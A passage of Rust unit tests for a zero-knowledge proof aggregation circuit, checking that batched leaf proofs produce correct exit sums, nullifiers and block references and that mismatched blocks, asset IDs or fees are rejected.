             circuit_logic::PrivateBatchCircuit,
             constants::{
                 aggregated_output, ASSET_ID_START, BLOCK_HASH_START, BLOCK_NUMBER_START,
                 EXIT_1_START, EXIT_2_START, LEAF_PI_LEN, NULLIFIER_START, OUTPUT_AMOUNT_1_START,
                 OUTPUT_AMOUNT_2_START, VOLUME_FEE_BPS_START,
             },
         },
         prover::witness::fill_private_batch_witness,
     };
 
     const TEST_ASSET_ID_U64: u64 = 0;
     const TEST_VOLUME_FEE_BPS: u64 = 10; // 0.1% = 10 bps
 
     // ---------------- Root PI header layout (private-batch aggregation output) ----------------
     // [ num_exit_slots(1), asset_id(1), volume_fee_bps(1), block_hash(4), block_number(1), ... ]
     const ROOT_NUM_EXIT_SLOTS_IDX: usize = 0;
     const ROOT_ASSET_ID_IDX: usize = 1;
     const ROOT_VOLUME_FEE_BPS_IDX: usize = 2;
     const ROOT_BLOCK_HASH_START: usize = 3;
     const ROOT_BLOCK_NUMBER_IDX: usize = 7;
     const ROOT_HEADER_LEN: usize = 8;
 
     // ---------------- Circuit helpers ----------------
 
     use test_helpers::fake_leaf::{build_fake_leaf_circuit, prove_fake_leaf_standalone};
 
     /// Build and prove the private-batch aggregation circuit using the split witness-filler path.
     fn aggregate_proofs_private_batch(
         leaf_proofs: Vec<ProofWithPublicInputs<F, C, D>>,
         leaf_common: CommonCircuitData<F, D>,
         leaf_verifier_only: VerifierOnlyCircuitData<C, D>,
         dummy_nullifier_pre_images: Vec<[F; 4]>,
     ) -> Result<(ProofWithPublicInputs<F, C, D>, VerifierCircuitData<F, C, D>)> {
         let n_leaf = leaf_proofs.len();
         assert!(n_leaf > 0, "need at least one leaf proof");
         assert_eq!(
             dummy_nullifier_pre_images.len(),
             n_leaf,
             "dummy_nullifier_pre_images must have one entry per leaf slot"
         );
 
         let agg_config = wormhole_private_batch_circuit_config();
         // SECURITY: leaf_verifier_only is now baked in at build time
         let agg_circuit = PrivateBatchCircuit::new(
             agg_config.clone(),
             &leaf_common,
             &leaf_verifier_only,
             n_leaf,
         );
         let targets = agg_circuit.targets();
         let prover_data = agg_circuit.build_prover();
 
         let mut pw = PartialWitness::new();
         // NOTE: leaf_verifier_only is no longer passed here - it's baked in as constants
         fill_private_batch_witness(&mut pw, &targets, &leaf_proofs, &dummy_nullifier_pre_images)?;
 
         let agg_proof = prover_data.prove(pw)?;
 
         // Build verifier data from the same config/leaf common so we can verify the result.
         // NOTE: Must use the same leaf_verifier_only to get matching circuit digest
         let verifier_data =
             PrivateBatchCircuit::new(agg_config, &leaf_common, &leaf_verifier_only, n_leaf)
                 .build_verifier();
 
         Ok((agg_proof, verifier_data))
     }
 
     fn deterministic_dummy_nullifier_pre_images(n: usize) -> Vec<[F; 4]> {
         let mut rng = StdRng::from_seed([77u8; 32]);
         (0..n)
             .map(|_| {
                 [
                     F::from_canonical_u64(rng.gen::<u32>() as u64),
                     F::from_canonical_u64(rng.gen::<u32>() as u64),
                     F::from_canonical_u64(rng.gen::<u32>() as u64),
                     F::from_canonical_u64(rng.gen::<u32>() as u64),
                 ]
             })
             .collect()
     }
 
     fn hash_dummy_nullifier_pre_image_native(pre_image: [F; 4]) -> [F; 4] {
         let inner_hash = Poseidon2Hash::hash_no_pad(&pre_image).elements;
         Poseidon2Hash::hash_no_pad(&inner_hash).elements
     }
 
     // ---------------- Packing helpers ----------------
 
     #[inline]
     fn limbs4_u64_to_felts(l: [u64; 4]) -> [F; 4] {
         [
             F::from_canonical_u64(l[0]),
             F::from_canonical_u64(l[1]),
             F::from_canonical_u64(l[2]),
             F::from_canonical_u64(l[3]),
         ]
     }
 
     #[inline]
     fn limbs8_u64_to_felts(l: [u64; 8]) -> [F; 8] {
         core::array::from_fn(|i| F::from_canonical_u64(l[i]))
     }
 
     #[inline]
     #[allow(clippy::too_many_arguments)]
     fn make_pi_from_felts(
         asset_id: F,
         output_amount_1: F,
         output_amount_2: F,
         volume_fee_bps: F,
         nullifier: [F; 4],
         exit_1: [F; 8],
         exit_2: [F; 8],
         block_hash: [F; 4],
         block_number: F,
     ) -> [F; LEAF_PI_LEN] {
         let mut out = [F::ZERO; LEAF_PI_LEN];
         out[ASSET_ID_START] = asset_id;
         out[OUTPUT_AMOUNT_1_START] = output_amount_1;
         out[OUTPUT_AMOUNT_2_START] = output_amount_2;
         out[VOLUME_FEE_BPS_START] = volume_fee_bps;
         out[NULLIFIER_START..NULLIFIER_START + 4].copy_from_slice(&nullifier);
         out[EXIT_1_START..EXIT_1_START + 8].copy_from_slice(&exit_1);
         out[EXIT_2_START..EXIT_2_START + 8].copy_from_slice(&exit_2);
         out[BLOCK_HASH_START..BLOCK_HASH_START + 4].copy_from_slice(&block_hash);
         out[BLOCK_NUMBER_START] = block_number;
         out
     }
 
     // ---------------- Hardcoded 64-bit-limb digests ----------------
     // Exit accounts use 8 felts (32-bit values) for collision-resistant encoding
 
     const EXIT_ACCOUNTS: [[u64; 8]; 8] = [
         [
             0x1111_0001,
             0x0000_0001,
             0x1111_0002,
             0x0000_0002,
             0x1111_0003,
             0x0000_0003,
             0x1111_0004,
             0x0000_0004,
         ],
         [
             0x2222_0001,
             0x0000_0001,
             0x2222_0002,
             0x0000_0002,
             0x2222_0003,
             0x0000_0003,
             0x2222_0004,
             0x0000_0004,
         ],
         [
             0x3333_0001,
             0x0000_0001,
             0x3333_0002,
             0x0000_0002,
             0x3333_0003,
             0x0000_0003,
             0x3333_0004,
             0x0000_0004,
         ],
         [
             0x4444_0001,
             0x0000_0001,
             0x4444_0002,
             0x0000_0002,
             0x4444_0003,
             0x0000_0003,
             0x4444_0004,
             0x0000_0004,
         ],
         [
             0x5555_0001,
             0x0000_0001,
             0x5555_0002,
             0x0000_0002,
             0x5555_0003,
             0x0000_0003,
             0x5555_0004,
             0x0000_0004,
         ],
         [
             0x6666_0001,
             0x0000_0001,
             0x6666_0002,
             0x0000_0002,
             0x6666_0003,
             0x0000_0003,
             0x6666_0004,
             0x0000_0004,
         ],
         [
             0x7777_0001,
             0x0000_0001,
             0x7777_0002,
             0x0000_0002,
             0x7777_0003,
             0x0000_0003,
             0x7777_0004,
             0x0000_0004,
         ],
         [
             0x8888_0001,
             0x0000_0001,
             0x8888_0002,
             0x0000_0002,
             0x8888_0003,
             0x0000_0003,
             0x8888_0004,
             0x0000_0004,
         ],
     ];
 
     const BLOCK_HASHES: [[u64; 4]; 8] = [
         [
             0xAAAA_0001_0000_0001,
             0xAAAA_0001_0000_0002,
             0xAAAA_0001_0000_0003,
             0xAAAA_0001_0000_0004,
         ],
         [
             0xBBBB_0001_0000_0001,
             0xBBBB_0001_0000_0002,
             0xBBBB_0001_0000_0003,
             0xBBBB_0001_0000_0004,
         ],
         [
             0xCCCC_0001_0000_0001,
             0xCCCC_0001_0000_0002,
             0xCCCC_0001_0000_0003,
             0xCCCC_0001_0000_0004,
         ],
         [
             0xDDDD_0001_0000_0001,
             0xDDDD_0001_0000_0002,
             0xDDDD_0001_0000_0003,
             0xDDDD_0001_0000_0004,
         ],
         [
             0xEEEE_0001_0000_0001,
             0xEEEE_0001_0000_0002,
             0xEEEE_0001_0000_0003,
             0xEEEE_0001_0000_0004,
         ],
         [
             0xFFFF_0001_0000_0001,
             0xFFFF_0001_0000_0002,
             0xFFFF_0001_0000_0003,
             0xFFFF_0001_0000_0004,
         ],
         [
             0xABCD_0001_0000_0001,
             0xABCD_0001_0000_0002,
             0xABCD_0001_0000_0003,
             0xABCD_0001_0000_0004,
         ],
         [
             0x1234_0001_0000_0001,
             0x1234_0001_0000_0002,
             0x1234_0001_0000_0003,
             0x1234_0001_0000_0004,
         ],
     ];
 
     const NULLIFIERS: [[u64; 4]; 8] = [
         [
             0x90A0_0001_0000_0001,
             0x90A0_0001_0000_0002,
             0x90A0_0001_0000_0003,
             0x90A0_0001_0000_0004,
         ],
         [
             0x80B0_0001_0000_0001,
             0x80B0_0001_0000_0002,
             0x80B0_0001_0000_0003,
             0x80B0_0001_0000_0004,
         ],
         [
             0x70C0_0001_0000_0001,
             0x70C0_0001_0000_0002,
             0x70C0_0001_0000_0003,
             0x70C0_0001_0000_0004,
         ],
         [
             0x60D0_0001_0000_0001,
             0x60D0_0001_0000_0002,
             0x60D0_0001_0000_0003,
             0x60D0_0001_0000_0004,
         ],
         [
             0x50E0_0001_0000_0001,
             0x50E0_0001_0000_0002,
             0x50E0_0001_0000_0003,
             0x50E0_0001_0000_0004,
         ],
         [
             0x40F0_0001_0000_0001,
             0x40F0_0001_0000_0002,
             0x40F0_0001_0000_0003,
             0x40F0_0001_0000_0004,
         ],
         [
             0x30A1_0001_0000_0001,
             0x30A1_0001_0000_0002,
             0x30A1_0001_0000_0003,
             0x30A1_0001_0000_0004,
         ],
         [
             0x20B2_0001_0000_0001,
             0x20B2_0001_0000_0002,
             0x20B2_0001_0000_0003,
             0x20B2_0001_0000_0004,
         ],
     ];
 
     #[test]
     fn recursive_aggregation_tree() {
         let mut rng = StdRng::from_seed([41u8; 32]);
 
         let output1_vals_u32: [u32; 8] = core::array::from_fn(|_| rng.gen::<u32>() >> 4);
         let output2_vals_u32: [u32; 8] = core::array::from_fn(|_| rng.gen::<u32>() >> 4);
 
         let output1_felts: [F; 8] =
             core::array::from_fn(|i| F::from_canonical_u64(output1_vals_u32[i] as u64));
         let output2_felts: [F; 8] =
             core::array::from_fn(|i| F::from_canonical_u64(output2_vals_u32[i] as u64));
 
         let exits_felts: [[F; 8]; 8] = EXIT_ACCOUNTS.map(limbs8_u64_to_felts);
         let block_hashes_felts: [[F; 4]; 8] = BLOCK_HASHES.map(limbs4_u64_to_felts);
         let nullifiers_felts: [[F; 4]; 8] = NULLIFIERS.map(limbs4_u64_to_felts);
 
         // All real proofs must be from the same block
         let common_block_hash = block_hashes_felts[0];
         let common_block_number = F::from_canonical_u64(42);
 
         let asset_id = F::from_canonical_u64(TEST_ASSET_ID_U64);
         let volume_fee_bps = F::from_canonical_u64(TEST_VOLUME_FEE_BPS);
 
         let mut pis_list: Vec<[F; LEAF_PI_LEN]> = Vec::with_capacity(8);
         for i in 0..8 {
             pis_list.push(make_pi_from_felts(
                 asset_id,
                 output1_felts[i],
                 output2_felts[i],
                 volume_fee_bps,
                 nullifiers_felts[i],
                 exits_felts[i],
                 exits_felts[(i + 1) % 8],
                 common_block_hash,
                 common_block_number,
             ));
         }
 
         let leaves = pis_list
             .clone()
             .into_iter()
             .map(prove_fake_leaf_standalone)
             .collect::<Vec<_>>();
 
         let leaf_common = leaves[0].1.common.clone();
         let leaf_verifier_only = leaves[0].1.verifier_only.clone();
         let proofs = leaves
             .into_iter()
             .map(|(proof, _)| proof)
             .collect::<Vec<_>>();
 
         let dummy_nullifier_pre_images = deterministic_dummy_nullifier_pre_images(proofs.len());
 
         let (root_proof, root_verifier) = aggregate_proofs_private_batch(
             proofs,
             leaf_common,
             leaf_verifier_only,
             dummy_nullifier_pre_images,
         )
         .unwrap();
 
         // ---------------------------
         // Reference aggregation OFF-CIRCUIT
         // ---------------------------
         let n_leaf = pis_list.len();
         assert_eq!(n_leaf, 8);
 
         let mut exit_sums: BTreeMap<[F; 4], F> = BTreeMap::new();
         for (i, pis) in pis_list.iter().enumerate() {
             let exit_1: [F; 4] = core::array::from_fn(|j| pis[EXIT_1_START + j]);
             let amount_1 = output1_felts[i];
             exit_sums
                 .entry(exit_1)
                 .and_modify(|s| *s += amount_1)
                 .or_insert(amount_1);
 
             let exit_2: [F; 4] = core::array::from_fn(|j| pis[EXIT_2_START + j]);
             let amount_2 = output2_felts[i];
             exit_sums
                 .entry(exit_2)
                 .and_modify(|s| *s += amount_2)
                 .or_insert(amount_2);
         }
 
         let block_hash_ref = common_block_hash;
         let block_num_ref = common_block_number;
 
         let mut nullifiers_ref: Vec<[F; 4]> = Vec::with_capacity(n_leaf);
         for pis in &pis_list {
             nullifiers_ref.push([
                 pis[NULLIFIER_START],
                 pis[NULLIFIER_START + 1],
                 pis[NULLIFIER_START + 2],
                 pis[NULLIFIER_START + 3],
             ]);
         }
 
         // ---------------------------
         // Parse aggregated PIs
         // ---------------------------
         let pis = &root_proof.public_inputs;
         let root_pi_len = n_leaf * LEAF_PI_LEN;
         assert_eq!(pis.len(), root_pi_len + ROOT_HEADER_LEN);
 
         let num_exit_slots_circuit = pis[ROOT_NUM_EXIT_SLOTS_IDX].to_canonical_u64() as usize;
         assert_eq!(num_exit_slots_circuit, n_leaf * 2);
 
         let asset_id_circuit = pis[ROOT_ASSET_ID_IDX];
         assert_eq!(asset_id_circuit, asset_id);
 
         let volume_fee_bps_circuit = pis[ROOT_VOLUME_FEE_BPS_IDX];
         assert_eq!(volume_fee_bps_circuit, volume_fee_bps);
 
         let block_hash_circuit: [F; 4] = [
             pis[ROOT_BLOCK_HASH_START],
             pis[ROOT_BLOCK_HASH_START + 1],
             pis[ROOT_BLOCK_HASH_START + 2],
             pis[ROOT_BLOCK_HASH_START + 3],
         ];
         let block_num_circuit = pis[ROOT_BLOCK_NUMBER_IDX];
         assert_eq!(block_hash_circuit, block_hash_ref);
         assert_eq!(block_num_circuit, block_num_ref);
 
         let mut idx = ROOT_HEADER_LEN;
 
         // Exit slots region: 2*N slots, each [sum(1), exit(4)]
         let mut exit_sums_from_circuit: BTreeMap<[F; 4], F> = BTreeMap::new();
         for _ in 0..(n_leaf * 2) {
             let sum_circuit = pis[idx];
             idx += 1;
 
             let exit_key_circuit: [F; 4] = core::array::from_fn(|j| pis[idx + j]);
             idx += 4;
 
             if sum_circuit != F::ZERO {
                 exit_sums_from_circuit
                     .entry(exit_key_circuit)
                     .or_insert(sum_circuit);
             }
         }
 
         // Convert to u64-based keys for reliable comparison
         // (BTreeMap with [F; 4] keys can be unreliable due to Ord impl)
         let exit_sums_u64: std::collections::HashMap<[u64; 4], u64> = exit_sums
             .iter()
             .map(|(k, v)| {
                 let k_u64: [u64; 4] = core::array::from_fn(|i| k[i].to_canonical_u64());
                 (k_u64, v.to_canonical_u64())
             })
             .collect();
 
         let exit_sums_from_circuit_u64: std::collections::HashMap<[u64; 4], u64> =
             exit_sums_from_circuit
                 .iter()
                 .map(|(k, v)| {
                     let k_u64: [u64; 4] = core::array::from_fn(|i| k[i].to_canonical_u64());
                     (k_u64, v.to_canonical_u64())
                 })
                 .collect();
 
         assert_eq!(
             exit_sums_u64.len(),
             exit_sums_from_circuit_u64.len(),
             "exit_sums size mismatch"
         );
 
         for (exit_key_u64, sum_ref_u64) in &exit_sums_u64 {
             let sum_from_circuit_u64 =
                 exit_sums_from_circuit_u64
                     .get(exit_key_u64)
                     .unwrap_or_else(|| {
                         panic!(
                             "exit_key {:?} not found in circuit output (sum_ref={})",
                             exit_key_u64, sum_ref_u64
                         )
                     });
             assert_eq!(
                 *sum_from_circuit_u64, *sum_ref_u64,
                 "sum mismatch for exit {:?}",
                 exit_key_u64
             );
         }
 
         // Nullifiers (real-proof-only test => should match leaf nullifiers exactly)
         for (leaf_idx, nullifier_expected) in nullifiers_ref.iter().enumerate() {
             let got = [pis[idx], pis[idx + 1], pis[idx + 2], pis[idx + 3]];
             idx += 4;
 
             assert_eq!(
                 got, *nullifier_expected,
                 "nullifier mismatch at leaf {leaf_idx}"
             );
         }
 
         // Padding zeros
         while idx < pis.len() {
             assert_eq!(pis[idx], F::ZERO, "expected zero padding at index {idx}");
             idx += 1;
         }
 
         // Verify final proof
         root_verifier.verify(root_proof).unwrap();
     }
 
     #[test]
     fn recursive_aggregation_tree_different_blocks_fails() {
         let mut rng = StdRng::from_seed([42u8; 32]);
 
         let output1_vals_u32: [u32; 8] = core::array::from_fn(|_| rng.gen::<u32>() >> 4);
         let output1_felts: [F; 8] =
             core::array::from_fn(|i| F::from_canonical_u64(output1_vals_u32[i] as u64));
 
         let exits_felts: [[F; 8]; 8] = EXIT_ACCOUNTS.map(limbs8_u64_to_felts);
         let block_hashes_felts: [[F; 4]; 8] = BLOCK_HASHES.map(limbs4_u64_to_felts);
         let nullifiers_felts: [[F; 4]; 8] = NULLIFIERS.map(limbs4_u64_to_felts);
 
         let block_numbers: [F; 8] = core::array::from_fn(|i| F::from_canonical_u64(i as u64));
         let asset_id = F::from_canonical_u64(TEST_ASSET_ID_U64);
         let volume_fee_bps = F::from_canonical_u64(TEST_VOLUME_FEE_BPS);
 
         let mut pis_list: Vec<[F; LEAF_PI_LEN]> = Vec::with_capacity(8);
         for i in 0..8 {
             pis_list.push(make_pi_from_felts(
                 asset_id,
                 output1_felts[i],
                 F::ZERO,
                 volume_fee_bps,
                 nullifiers_felts[i],
                 exits_felts[i],
                 [F::ZERO; 8],
                 block_hashes_felts[i], // different block hash per proof -> should fail
                 block_numbers[i],      // different block number per proof -> should fail
             ));
         }
 
         let leaves = pis_list
             .into_iter()
             .map(prove_fake_leaf_standalone)
             .collect::<Vec<_>>();
         let leaf_common = leaves[0].1.common.clone();
         let leaf_verifier_only = leaves[0].1.verifier_only.clone();
         let proofs = leaves
             .into_iter()
             .map(|(proof, _)| proof)
             .collect::<Vec<_>>();
         let dummy_nullifier_pre_images = deterministic_dummy_nullifier_pre_images(proofs.len());
 
         let res = aggregate_proofs_private_batch(
             proofs,
             leaf_common,
             leaf_verifier_only,
             dummy_nullifier_pre_images,
         );
 
         assert!(
             res.is_err(),
             "expected failure because proofs are from different blocks"
         );
     }
 
     #[test]
     fn recursive_aggregation_tree_mismatched_asset_id_fails() {
         let asset_a = F::from_canonical_u64(7);
         let asset_b = F::from_canonical_u64(9);
 
         let output_felts: [F; 8] = core::array::from_fn(|_| F::from_canonical_u64(1));
 
         let exits_felts: [[F; 8]; 8] = EXIT_ACCOUNTS.map(limbs8_u64_to_felts);
         let block_hashes_felts: [[F; 4]; 8] = BLOCK_HASHES.map(limbs4_u64_to_felts);
         let nullifiers_felts: [[F; 4]; 8] = NULLIFIERS.map(limbs4_u64_to_felts);
 
         let block_numbers: [F; 8] = core::array::from_fn(|i| F::from_canonical_u64(i as u64));
         let volume_fee_bps = F::from_canonical_u64(TEST_VOLUME_FEE_BPS);
 
         let mut pis_list: Vec<[F; LEAF_PI_LEN]> = Vec::with_capacity(8);
         for i in 0..8 {
             let asset_id = if i == 3 { asset_b } else { asset_a };
             pis_list.push(make_pi_from_felts(
                 asset_id,
                 output_felts[i],
                 F::ZERO,
                 volume_fee_bps,
                 nullifiers_felts[i],
                 exits_felts[i],
                 [F::ZERO; 8],
                 block_hashes_felts[i],
                 block_numbers[i],
             ));
         }
 
         let leaves = pis_list
             .into_iter()
             .map(prove_fake_leaf_standalone)
             .collect::<Vec<_>>();
         let leaf_common = leaves[0].1.common.clone();
         let leaf_verifier_only = leaves[0].1.verifier_only.clone();
         let proofs = leaves
             .into_iter()
             .map(|(proof, _)| proof)
             .collect::<Vec<_>>();
         let dummy_nullifier_pre_images = deterministic_dummy_nullifier_pre_images(proofs.len());
 
         let res = aggregate_proofs_private_batch(
             proofs,
             leaf_common,
             leaf_verifier_only,
             dummy_nullifier_pre_images,
         );
 
         assert!(res.is_err(), "expected failure due to mismatched asset IDs");
     }
 
     #[test]
     fn recursive_aggregation_tree_with_dummy_proofs() {
         // 2 real proofs + 6 dummy proofs (block_hash = 0 sentinel)
         let mut rng = StdRng::from_seed([99u8; 32]);
 
         let output_vals_u32: [u32; 8] = core::array::from_fn(|_| rng.gen::<u32>() >> 4);
         let output_felts: [F; 8] =
             core::array::from_fn(|i| F::from_canonical_u64(output_vals_u32[i] as u64));
 
         let exits_felts: [[F; 8]; 8] = EXIT_ACCOUNTS.map(limbs8_u64_to_felts);
         let block_hashes_felts: [[F; 4]; 8] = BLOCK_HASHES.map(limbs4_u64_to_felts);
         let nullifiers_felts: [[F; 4]; 8] = NULLIFIERS.map(limbs4_u64_to_felts);
 
         let num_real_proofs = 2usize;
 
         // All real proofs share the same block
         let common_block_hash = block_hashes_felts[0];
         let common_block_number = F::from_canonical_u64(42);
 
         let asset_id = F::from_canonical_u64(TEST_ASSET_ID_U64);
         let volume_fee_bps = F::from_canonical_u64(TEST_VOLUME_FEE_BPS);
 
         let mut pis_list: Vec<[F; LEAF_PI_LEN]> = Vec::with_capacity(8);
 
         // Real proofs
         for i in 0..num_real_proofs {
             pis_list.push(make_pi_from_felts(
                 asset_id,
                 output_felts[i],
                 F::ZERO,
                 volume_fee_bps,
                 nullifiers_felts[i],
                 exits_felts[i],
                 [F::ZERO; 8],
                 common_block_hash,
                 common_block_number,
             ));
         }
 
         // Dummy proofs: zero block hash + zero outputs + zero exits
         let dummy_exit = [F::ZERO; 8];
         let dummy_block_hash = [F::ZERO; 4];
         for nullifier in nullifiers_felts.iter().skip(num_real_proofs) {
             pis_list.push(make_pi_from_felts(
                 asset_id,
                 F::ZERO,
                 F::ZERO,
                 volume_fee_bps,
                 *nullifier, // private-batch replaces dummy nullifiers with hashes of provided preimages
                 dummy_exit,
                 dummy_exit,
                 dummy_block_hash,
                 F::ZERO,
             ));
         }
 
         let leaves = pis_list
             .clone()
             .into_iter()
             .map(prove_fake_leaf_standalone)
             .collect::<Vec<_>>();
         let leaf_common = leaves[0].1.common.clone();
         let leaf_verifier_only = leaves[0].1.verifier_only.clone();
         let proofs = leaves
             .into_iter()
             .map(|(proof, _)| proof)
             .collect::<Vec<_>>();
 
         let dummy_nullifier_pre_images = deterministic_dummy_nullifier_pre_images(proofs.len());
 
         let (root_proof, root_verifier) = aggregate_proofs_private_batch(
             proofs,
             leaf_common,
             leaf_verifier_only,
             dummy_nullifier_pre_images.clone(),
         )
         .unwrap();
 
         root_verifier.verify(root_proof.clone()).unwrap();
 
         let pis = &root_proof.public_inputs;
 
         // Root header should reference the real block
         let block_hash_circuit: [F; 4] = [
             pis[ROOT_BLOCK_HASH_START],
             pis[ROOT_BLOCK_HASH_START + 1],
             pis[ROOT_BLOCK_HASH_START + 2],
             pis[ROOT_BLOCK_HASH_START + 3],
         ];
         assert_eq!(block_hash_circuit, common_block_hash);
 
         let block_num_circuit = pis[ROOT_BLOCK_NUMBER_IDX];
         assert_eq!(block_num_circuit, common_block_number);
 
         let nullifier_region_start =
             ROOT_HEADER_LEN + (pis_list.len() * 2 * aggregated_output::EXIT_SLOT_LEN);
         for (i, nullifier) in nullifiers_felts.iter().enumerate().take(num_real_proofs) {
             let idx = nullifier_region_start + i * 4;
             let got = [pis[idx], pis[idx + 1], pis[idx + 2], pis[idx + 3]];
             assert_eq!(got, *nullifier, "real nullifier mismatch at leaf {i}");
         }
 
         for (i, pre_image) in dummy_nullifier_pre_images
             .iter()
             .enumerate()
             .take(pis_list.len())
             .skip(num_real_proofs)
         {
             let idx = nullifier_region_start + i * 4;
             let got = [pis[idx], pis[idx + 1], pis[idx + 2], pis[idx + 3]];
             let expected = hash_dummy_nullifier_pre_image_native(*pre_image);
             assert_eq!(got, expected, "dummy nullifier hash mismatch at leaf {i}");
         }
 
         println!(
             "Successfully aggregated {} real proofs + {} dummy proofs!",
             num_real_proofs,
             8 - num_real_proofs
         );
     }
 
     /// Regression test: the circuit must accept the real proof in EVERY slot position. The
     /// old circuit read its block reference from slot 0 and required the prover to pin a
     /// real proof there, leaking that nullifier[0] was always real. The block reference is
     /// now selected in-circuit from the first non-dummy slot, so any slot order (uniform
     /// shuffle) must be satisfiable.
     ///
     /// Runs the full flow (leaf proving, aggregation, root verification, public-input
     /// checks) once per position of the real proof in a 4-leaf batch.
     #[test]
     fn recursive_aggregation_real_proof_in_every_slot_succeeds() {
         const N_LEAF: usize = 4;
 
         let exits_felts: [[F; 8]; 8] = EXIT_ACCOUNTS.map(limbs8_u64_to_felts);
         let block_hashes_felts: [[F; 4]; 8] = BLOCK_HASHES.map(limbs4_u64_to_felts);
         let nullifiers_felts: [[F; 4]; 8] = NULLIFIERS.map(limbs4_u64_to_felts);
 
         let common_block_hash = block_hashes_felts[0];
         let common_block_number = F::from_canonical_u64(42);
         let asset_id = F::from_canonical_u64(TEST_ASSET_ID_U64);
         let volume_fee_bps = F::from_canonical_u64(TEST_VOLUME_FEE_BPS);
 
         let dummy_exit = [F::ZERO; 8];
         let dummy_block_hash = [F::ZERO; 4];
 
         for real_slot in 0..N_LEAF {
             let mut pis_list: Vec<[F; LEAF_PI_LEN]> = Vec::with_capacity(N_LEAF);
 
             for i in 0..N_LEAF {
                 if i == real_slot {
                     let real_amount = F::from_canonical_u64(500);
                     pis_list.push(make_pi_from_felts(
                         asset_id,
                         real_amount,
                         F::ZERO,
                         volume_fee_bps,
                         nullifiers_felts[i],
                         exits_felts[i],
                         [F::ZERO; 8],
                         common_block_hash,
                         common_block_number,
                     ));
                 } else {
                     pis_list.push(make_pi_from_felts(
                         asset_id,
                         F::ZERO,
                         F::ZERO,
                         volume_fee_bps,
                         nullifiers_felts[i],
                         dummy_exit,
                         dummy_exit,
                         dummy_block_hash,
                         F::ZERO,
                     ));
                 }
             }
 
             let leaves = pis_list
                 .clone()
                 .into_iter()
                 .map(prove_fake_leaf_standalone)
                 .collect::<Vec<_>>();
             let leaf_common = leaves[0].1.common.clone();
             let leaf_verifier_only = leaves[0].1.verifier_only.clone();
             let proofs = leaves
                 .into_iter()
                 .map(|(proof, _)| proof)
                 .collect::<Vec<_>>();
 
             let dummy_nullifier_pre_images = deterministic_dummy_nullifier_pre_images(proofs.len());
 
             let (root_proof, root_verifier) = aggregate_proofs_private_batch(
                 proofs,
                 leaf_common,
                 leaf_verifier_only,
                 dummy_nullifier_pre_images.clone(),
             )
             .unwrap_or_else(|e| {
                 panic!("aggregation with real proof in slot {real_slot} must be satisfiable: {e}")
             });
 
             root_verifier.verify(root_proof.clone()).unwrap();
 
             let pis = &root_proof.public_inputs;
 
             // Header must reference the real block regardless of which slot holds it.
             let block_hash_circuit: [F; 4] = [
                 pis[ROOT_BLOCK_HASH_START],
                 pis[ROOT_BLOCK_HASH_START + 1],
                 pis[ROOT_BLOCK_HASH_START + 2],
                 pis[ROOT_BLOCK_HASH_START + 3],
             ];
             assert_eq!(
                 block_hash_circuit, common_block_hash,
                 "block reference must come from the real slot {real_slot}"
             );
             assert_eq!(pis[ROOT_BLOCK_NUMBER_IDX], common_block_number);
 
             let nullifier_region_start =
                 ROOT_HEADER_LEN + (N_LEAF * 2 * aggregated_output::EXIT_SLOT_LEN);
 
             for (i, pre_image) in dummy_nullifier_pre_images.iter().enumerate() {
                 let idx = nullifier_region_start + i * 4;
                 let got = [pis[idx], pis[idx + 1], pis[idx + 2], pis[idx + 3]];
                 if i == real_slot {
                     // Real nullifier must be forwarded unchanged.
                     assert_eq!(
                         got, nullifiers_felts[i],
                         "real nullifier must be preserved in slot {i}"
                     );
                 } else {
                     // Dummy nullifiers must be replaced with hashes of the preimages.
                     let expected = hash_dummy_nullifier_pre_image_native(*pre_image);
                     assert_eq!(got, expected, "dummy nullifier hash mismatch at leaf {i}");
                 }
             }
         }
     }
 
     #[test]
     fn recursive_aggregation_tree_all_dummy_proofs() {
         // All 8 proofs are dummy (block_hash = 0 sentinel)
         // This tests that the circuit accepts an all-dummy batch
         let nullifiers_felts: [[F; 4]; 8] = NULLIFIERS.map(limbs4_u64_to_felts);
 
         let asset_id = F::from_canonical_u64(TEST_ASSET_ID_U64);
         let volume_fee_bps = F::from_canonical_u64(TEST_VOLUME_FEE_BPS);
 
         let dummy_exit = [F::ZERO; 8];
         let dummy_block_hash = [F::ZERO; 4];
 
         let mut pis_list: Vec<[F; LEAF_PI_LEN]> = Vec::with_capacity(8);
         for nullifier in &nullifiers_felts {
             pis_list.push(make_pi_from_felts(
                 asset_id,
                 F::ZERO,
                 F::ZERO,
                 volume_fee_bps,
                 *nullifier,
                 dummy_exit,
                 dummy_exit,
                 dummy_block_hash,
                 F::ZERO,
             ));
         }
 
         let leaves = pis_list
             .clone()
             .into_iter()
             .map(prove_fake_leaf_standalone)
             .collect::<Vec<_>>();
         let leaf_common = leaves[0].1.common.clone();
         let leaf_verifier_only = leaves[0].1.verifier_only.clone();
         let proofs = leaves
             .into_iter()
             .map(|(proof, _)| proof)
             .collect::<Vec<_>>();
 
         let dummy_nullifier_pre_images = deterministic_dummy_nullifier_pre_images(proofs.len());
 
         let (root_proof, root_verifier) = aggregate_proofs_private_batch(
             proofs,
             leaf_common,
             leaf_verifier_only,
             dummy_nullifier_pre_images.clone(),
         )
         .unwrap();
 
         root_verifier.verify(root_proof.clone()).unwrap();
 
         let pis = &root_proof.public_inputs;
 
         // Block hash should be zero (all dummy)
         let block_hash_circuit: [F; 4] = [
             pis[ROOT_BLOCK_HASH_START],
             pis[ROOT_BLOCK_HASH_START + 1],
             pis[ROOT_BLOCK_HASH_START + 2],
             pis[ROOT_BLOCK_HASH_START + 3],
         ];
         assert_eq!(
             block_hash_circuit,
             [F::ZERO; 4],
             "all-dummy batch should have zero block hash"
         );
 
         // All nullifiers should be replaced with hashes of the pre-images
         let nullifier_region_start =
             ROOT_HEADER_LEN + (pis_list.len() * 2 * aggregated_output::EXIT_SLOT_LEN);
         for (i, pre_image) in dummy_nullifier_pre_images.iter().enumerate() {
             let idx = nullifier_region_start + i * 4;
             let got = [pis[idx], pis[idx + 1], pis[idx + 2], pis[idx + 3]];
             let expected = hash_dummy_nullifier_pre_image_native(*pre_image);
             assert_eq!(got, expected, "dummy nullifier hash mismatch at leaf {i}");
         }
 
         println!("Successfully aggregated all-dummy batch of 8 proofs!");
     }
 
     #[test]
     fn recursive_aggregation_tree_mismatched_volume_fee_bps_fails() {
         let volume_fee_a = F::from_canonical_u64(10); // 0.1%
         let volume_fee_b = F::from_canonical_u64(50); // 0.5%
 
         let output_felts: [F; 8] = core::array::from_fn(|_| F::from_canonical_u64(1));
 
         let exits_felts: [[F; 8]; 8] = EXIT_ACCOUNTS.map(limbs8_u64_to_felts);
